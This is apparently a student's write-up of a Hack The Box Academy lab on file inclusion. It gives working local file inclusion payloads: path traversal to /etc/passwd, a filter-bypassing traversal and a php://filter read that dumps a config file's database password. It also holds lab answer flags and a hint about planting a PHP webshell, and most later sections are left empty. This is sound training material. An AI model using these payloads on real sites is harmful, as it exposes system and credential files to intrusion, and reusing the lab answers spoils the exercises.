# File Inclusion
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: File Inclusion
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 8 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Local File Inclusion (LFI)
### Question 1:
![](Pasted%20image%2020220729095110.png)

*Hint: Read the passwd file*

Change the language to spanisha nd edit the URL parameter to `../../../../etc/passwd`.

![](Pasted%20image%2020220729115604.png)

**Answer:** `barry`

### Question 2:
![](Pasted%20image%2020220729095133.png)

*Hint: Don't forget to traverse paths*

Same again, this time insert `../../../../usr/share/flags/flag.txt` into parameter.

![](Pasted%20image%2020220729115823.png)

**Answer:** `HTB{n3v3r_tru$t_u$3r_!nput}`

---
## Basic Bypasses
### Question:
![](Pasted%20image%2020220729095303.png)

*Hint: Try to see what path the regular functionality uses*

Building payload `languages/....//....//....//....//flag.txt`.

Then URL encode it. 

![](Pasted%20image%2020220729125047.png)

![](Pasted%20image%2020220729125225.png)

**Answer:** `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`

---
## PHP Filters
### Question:
![](Pasted%20image%2020220729095351.png)

*Hint: Try to find an interesting php configuration file*

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w ~/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://46.101.2.216:32503/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://46.101.2.216:32503/FUZZ.php
 :: Wordlist         : FUZZ: /home/kali/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

en                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
es                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
index                   [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 1748ms]
configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 48ms]
```

Use payload `php://filter/read=convert.base64-encode/resource=configure`.

![](Pasted%20image%2020220729131628.png)

Decode the base64 value:

```
┌──(kali㉿kali)-[~]
└─$ echo "PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7" | base64 -d
<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);

$API_KEY = "Awew242GDshrf46+35/k";
```

**Answer:** `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`

---
## PHP Wrappers
### Question:
![](Pasted%20image%2020220729095449.png)

**Answer:** ``

---
## Remote File Inclusion (RFI)
### Question:
![](Pasted%20image%2020220729095515.png)

**Answer:** ``

---
## LFI and File Uploads
### Question:
![](Pasted%20image%2020220729095538.png)

*Hint: Are you using the correct upload directory?*

**Answer:** ``

---
## Log Poisoning
### Question 1:
![](Pasted%20image%2020220729095631.png)

**Answer:** ``

### Question 2:
![](Pasted%20image%2020220729095652.png)

**Answer:** ``

---
## Automated Scanning
### Question:
![](Pasted%20image%2020220729095716.png)

*Hint: Use the LFI-Jhaddix.txt wordlist to find working LFI payloads, then use one of them to read the flag*

**Answer:** ``

---
## File Inclusion Prevention
### Question 1:
![](Pasted%20image%2020220729095823.png)

**Answer:** ``

### Question 2:
![](Pasted%20image%2020220729095840.png)

*Hint: Place a PHP File in /var/www/html/ which contains a PHP Webshell using SYSTEM(), then use curl to execute the file. Be sure to restart apache after editing the PHP Configuration!*

**Answer:** ``

---
## Skills Assessment
### Question:
![](Pasted%20image%2020220729095925.png)

**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]